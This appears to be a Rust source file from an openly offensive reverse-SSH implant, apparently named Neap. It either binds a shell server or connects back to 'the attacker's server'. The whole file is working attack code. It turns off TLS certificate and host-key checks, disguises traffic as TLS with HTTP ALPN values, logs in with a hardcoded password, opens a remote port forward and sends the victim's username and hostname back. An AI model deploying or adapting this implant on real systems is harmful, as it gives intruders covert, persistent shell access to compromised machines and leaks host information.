use std::sync::Arc;

use async_trait::async_trait;
use log::{error, info};
use russh::client;
use russh::keys::key;
use russh::server::{Config as ServerConfig, Server as _};
use russh::{Channel, CryptoVec};
use rustls::client::danger::{HandshakeSignatureValid, ServerCertVerified, ServerCertVerifier};
use rustls::pki_types::{CertificateDer, ServerName as TlsServerName, UnixTime};
use rustls::SignatureScheme;

use crate::error::{NeapError, Result};
use crate::server::{build_config, generate_host_key, NeapServer};
use crate::Params;

// ---------------------------------------------------------------------------
// TLS: self-signed certificate generation
// ---------------------------------------------------------------------------

/// Generate a self-signed TLS certificate for the given SNI hostname.
///
/// Uses `rcgen` to create an ECDSA certificate (the default key type)
/// and returns the DER-encoded certificate chain and private key in
/// types compatible with `rustls`.
fn generate_self_signed_cert(
    sni: &str,
) -> Result<(
    Vec<CertificateDer<'static>>,
    rustls::pki_types::PrivateKeyDer<'static>,
)> {
    let rcgen::CertifiedKey { cert, key_pair } =
        rcgen::generate_simple_self_signed(vec![sni.to_string()]).map_err(|e| {
            NeapError::Config(format!("Failed to generate self-signed cert: {}", e))
        })?;

    let cert_der = cert.der().clone();
    let key_der = rustls::pki_types::PrivatePkcs8KeyDer::from(key_pair.serialize_der()).into();

    Ok((vec![cert_der], key_der))
}

// ---------------------------------------------------------------------------
// TLS: NoCertVerifier — accept any server certificate (for reverse mode)
// ---------------------------------------------------------------------------

/// A `ServerCertVerifier` that accepts **any** server certificate without
/// validation.  Used in reverse mode where we connect back to the attacker's
/// server over TLS — equivalent to Go's `InsecureSkipVerify`.
#[derive(Debug)]
struct NoCertVerifier;

impl ServerCertVerifier for NoCertVerifier {
    fn verify_server_cert(
        &self,
        _end_entity: &CertificateDer<'_>,
        _intermediates: &[CertificateDer<'_>],
        _server_name: &TlsServerName<'_>,
        _ocsp_response: &[u8],
        _now: UnixTime,
    ) -> std::result::Result<ServerCertVerified, rustls::Error> {
        Ok(ServerCertVerified::assertion())
    }

    fn verify_tls12_signature(
        &self,
        _message: &[u8],
        _cert: &CertificateDer<'_>,
        _dss: &rustls::DigitallySignedStruct,
    ) -> std::result::Result<HandshakeSignatureValid, rustls::Error> {
        Ok(HandshakeSignatureValid::assertion())
    }

    fn verify_tls13_signature(
        &self,
        _message: &[u8],
        _cert: &CertificateDer<'_>,
        _dss: &rustls::DigitallySignedStruct,
    ) -> std::result::Result<HandshakeSignatureValid, rustls::Error> {
        Ok(HandshakeSignatureValid::assertion())
    }

    fn supported_verify_schemes(&self) -> Vec<SignatureScheme> {
        vec![
            SignatureScheme::ECDSA_NISTP384_SHA384,
            SignatureScheme::ECDSA_NISTP256_SHA256,
            SignatureScheme::ED25519,
            SignatureScheme::RSA_PSS_SHA512,
            SignatureScheme::RSA_PSS_SHA384,
            SignatureScheme::RSA_PSS_SHA256,
            SignatureScheme::RSA_PKCS1_SHA512,
            SignatureScheme::RSA_PKCS1_SHA384,
            SignatureScheme::RSA_PKCS1_SHA256,
        ]
    }
}

// ---------------------------------------------------------------------------
// Graceful shutdown
// ---------------------------------------------------------------------------

/// Wait for a shutdown signal (Ctrl+C / SIGINT, or SIGTERM on Unix).
async fn shutdown_signal() {
    #[cfg(unix)]
    {
        use tokio::signal::unix::{signal, SignalKind};

        let mut sigterm =
            signal(SignalKind::terminate()).expect("failed to register SIGTERM handler");
        let mut sigint =
            signal(SignalKind::interrupt()).expect("failed to register SIGINT handler");

        tokio::select! {
            _ = sigterm.recv() => {
                info!("Received SIGTERM");
            }
            _ = sigint.recv() => {
                info!("Received SIGINT");
            }
        }
    }

    #[cfg(not(unix))]
    {
        tokio::signal::ctrl_c()
            .await
            .expect("failed to listen for Ctrl+C");
        info!("Received Ctrl+C");
    }
}

// ---------------------------------------------------------------------------
// Main entry point
// ---------------------------------------------------------------------------

/// Main entry point for the transport layer.
pub async fn run(params: &Params) -> Result<()> {
    let host_key = generate_host_key()?;
    let ssh_config = build_config(host_key);

    let server = NeapServer {
        shell: params.shell.clone(),
        no_shell: params.no_shell,
    };

    let server_future = async {
        if params.listen || params.lhost.is_empty() {
            run_bind(params, ssh_config, server).await
        } else {
            run_reverse(params, ssh_config, server).await
        }
    };

    // Race the server against a shutdown signal.
    tokio::select! {
        result = server_future => result,
        _ = shutdown_signal() => {
            info!("Shutting down...");
            // Allow a brief drain period for in-flight connections.
            tokio::time::sleep(std::time::Duration::from_secs(5)).await;
            info!("Shutdown complete");
            Ok(())
        }
    }
}

/// Bind mode: listen on a local port and serve SSH connections.
async fn run_bind(
    params: &Params,
    config: Arc<ServerConfig>,
    mut server: NeapServer,
) -> Result<()> {
    let addr = format!("0.0.0.0:{}", params.lport);

    if params.tls_wrap {
        // ---- TLS bind mode --------------------------------------------------
        let (cert_chain, key_der) = generate_self_signed_cert(&params.tls_sni)?;

        let mut tls_config = rustls::ServerConfig::builder()
            .with_no_client_auth()
            .with_single_cert(cert_chain, key_der)
            .map_err(NeapError::Tls)?;

        tls_config.alpn_protocols = vec![b"h2".to_vec(), b"http/1.1".to_vec()];

        let tls_acceptor = tokio_rustls::TlsAcceptor::from(Arc::new(tls_config));

        let listener = tokio::net::TcpListener::bind(&addr).await?;
        info!("Starting TLS+SSH server on :{}", params.lport);
        info!(
            "Success: TLS listening on {} (SNI: {})",
            addr, params.tls_sni
        );

        loop {
            let (tcp_stream, peer_addr) = listener.accept().await?;
            info!("Accepted TCP connection from {}", peer_addr);

            let acceptor = tls_acceptor.clone();
            let ssh_cfg = Arc::clone(&config);
            let handler = server.new_client(Some(peer_addr));

            tokio::spawn(async move {
                match acceptor.accept(tcp_stream).await {
                    Ok(tls_stream) => {
                        info!("TLS handshake completed with {}", peer_addr);
                        match russh::server::run_stream(ssh_cfg, tls_stream, handler).await {
                            Ok(session) => {
                                if let Err(e) = session.await {
                                    error!("SSH session error (TLS) from {}: {:?}", peer_addr, e);
                                }
                            }
                            Err(e) => {
                                error!(
                                    "Failed to start SSH session (TLS) from {}: {:?}",
                                    peer_addr, e
                                );
                            }
                        }
                    }
                    Err(e) => {
                        error!("TLS handshake failed from {}: {:?}", peer_addr, e);
                    }
                }
            });
        }
    } else {
        // ---- Plain SSH bind mode --------------------------------------------
        info!("Starting ssh server on :{}", params.lport);
        info!("Success: listening on {}", addr);

        server
            .run_on_address(config, &addr as &str)
            .await
            .map_err(NeapError::Io)
    }
}

// ---------------------------------------------------------------------------
// Reverse mode
// ---------------------------------------------------------------------------

/// Client handler for the reverse-mode SSH connection back to the attacker.
///
/// Implements `russh::client::Handler` to:
/// - Accept any server host key (equivalent to Go's `InsecureIgnoreHostKey`)
/// - Bridge forwarded-tcpip channels to our SSH server
struct ReverseClientHandler {
    /// SSH server config used to serve connections arriving through the forward.
    server_config: Arc<ServerConfig>,
    /// Per-connection server template.
    server: NeapServer,
}

#[async_trait]
impl client::Handler for ReverseClientHandler {
    type Error = NeapError;

    /// Accept any host key — we are connecting to the attacker's server, so
    /// host-key verification is intentionally skipped (mirrors Go's
    /// `InsecureIgnoreHostKey`).
    async fn check_server_key(
        &mut self,
        _server_public_key: &key::PublicKey,
    ) -> std::result::Result<bool, Self::Error> {
        Ok(true)
    }

    /// Called when the attacker's SSH server opens a forwarded-tcpip channel
    /// (i.e. someone connected to the forwarded port).  We run a full Neap SSH
    /// server on top of the channel stream so the connecting party gets an
    /// interactive SSH session.
    async fn server_channel_open_forwarded_tcpip(
        &mut self,
        channel: Channel<client::Msg>,
        connected_address: &str,
        connected_port: u32,
        originator_address: &str,
        originator_port: u32,
        _session: &mut client::Session,
    ) -> std::result::Result<(), Self::Error> {
        info!(
            "Forwarded connection: {}:{} from {}:{}",
            connected_address, connected_port, originator_address, originator_port
        );

        // Convert the SSH channel into an AsyncRead + AsyncWrite stream so we
        // can feed it directly into `russh::server::run_stream`.
        let stream = channel.into_stream();
        let config = Arc::clone(&self.server_config);
        let handler = self.server.new_client(None);

        // Spawn the SSH server session on this forwarded stream.
        tokio::spawn(async move {
            match russh::server::run_stream(config, stream, handler).await {
                Ok(session) => {
                    // `session` is a RunningSession future — await it to
                    // keep the session alive until the client disconnects.
                    if let Err(e) = session.await {
                        error!("Reverse SSH session error: {:?}", e);
                    }
                }
                Err(e) => {
                    error!("Failed to start reverse SSH session: {:?}", e);
                }
            }
        });

        Ok(())
    }
}

/// Reverse mode: connect back to the attacker's SSH server, authenticate,
/// request a remote port forward, send system info, and serve SSH connections
/// arriving through the forward.
async fn run_reverse(
    params: &Params,
    server_config: Arc<ServerConfig>,
    server: NeapServer,
) -> Result<()> {
    let addr = format!("{}:{}", params.lhost, params.lport);

    // --- 1. Connect as an SSH client to the attacker's server ----------------
    let client_config = Arc::new(client::Config::default());
    let handler = ReverseClientHandler {
        server_config: Arc::clone(&server_config),
        server: server.clone(),
    };

    let mut handle = if params.tls_wrap {
        // ---- TLS reverse mode -----------------------------------------------
        info!(
            "Dialling home via TLS+SSH to {} (SNI: {})",
            addr, params.tls_sni
        );

        let mut tls_config = rustls::ClientConfig::builder()
            .dangerous()
            .with_custom_certificate_verifier(Arc::new(NoCertVerifier))
            .with_no_client_auth();

        tls_config.alpn_protocols = vec![b"h2".to_vec(), b"http/1.1".to_vec()];

        let tls_connector = tokio_rustls::TlsConnector::from(Arc::new(tls_config));

        let tcp_stream = tokio::net::TcpStream::connect(&addr).await?;

        let server_name: TlsServerName<'_> = TlsServerName::try_from(params.tls_sni.as_str())
            .map_err(|e| NeapError::Config(format!("Invalid TLS SNI '{}': {}", params.tls_sni, e)))?
            .to_owned();

        let tls_stream = tls_connector
            .connect(server_name, tcp_stream)
            .await
            .map_err(NeapError::Io)?;

        info!("TLS handshake completed with {}", addr);

        client::connect_stream(client_config, tls_stream, handler).await?
    } else {
        // ---- Plain SSH reverse mode -----------------------------------------
        info!("Reverse mode: connecting to {}", addr);
        client::connect(client_config, &addr as &str, handler).await?
    };

    info!("Connected to {}", addr);

    // --- 2. Authenticate with password ---------------------------------------
    let auth_ok = handle
        .authenticate_password(&params.luser, crate::config::PASSWORD)
        .await
        .map_err(NeapError::Ssh)?;

    if !auth_ok {
        return Err(NeapError::Config(format!(
            "Password authentication failed for user '{}' at {}",
            params.luser, addr
        )));
    }

    info!("Authenticated as '{}' at {}", params.luser, addr);

    // --- 3. Request remote port forward --------------------------------------
    let bind_port = params.bind_port as u32;
    let actual_port = handle
        .tcpip_forward("127.0.0.1", bind_port)
        .await
        .map_err(NeapError::Ssh)?;

    // When bind_port is 0, the server picks a random port and returns it.
    let listening_port = if actual_port != 0 {
        actual_port
    } else {
        bind_port
    };
    let listening_addr = format!("127.0.0.1:{}", listening_port);
    info!("Success: listening at home on {}", listening_addr);

    // --- 4. Send extra info via an "rs-info" session channel -----------------
    //
    // Ideally we would open a channel with type "rs-info" and include the
    // serialized ExtraInfo as extra data in the channel-open message.  The
    // russh public client API does not expose custom channel types, so we send
    // the info as data on a regular session channel instead.  The attacker
    // should read the first message on any new session channel and check if it
    // is ExtraInfo-formatted data.
    //
    // The original Go implementation opens a custom "rs-info" channel which the
    // attacker rejects with "th4nkz".  Here we approximate that behaviour: we
    // open a session, send the info payload, then close the channel.
    let extra = crate::info::ExtraInfo::gather_native(&listening_addr);
    info!(
        "System info: user={}, host={}, listen={}",
        extra.current_user, extra.hostname, extra.listening_address
    );

    if let Ok(channel) = handle.channel_open_session().await {
        let info_bytes = extra.to_ssh_bytes();
        // Send the info payload and immediately close — we don't expect a
        // response (the attacker may reject or ignore the channel).
        let id = channel.id();
        let _ = handle.data(id, CryptoVec::from_slice(&info_bytes)).await;
        // We intentionally ignore errors here; the attacker may close the
        // channel before we finish writing.
    }

    // --- 5. Keep alive — wait for the SSH connection to drop -----------------
    //
    // The `handle` is a Future that resolves when the underlying SSH session
    // ends.  Awaiting it keeps us alive, serving forwarded connections via
    // `server_channel_open_forwarded_tcpip` in the handler above.
    info!("Serving reverse SSH connections…");
    handle.await?;

    Ok(())
}
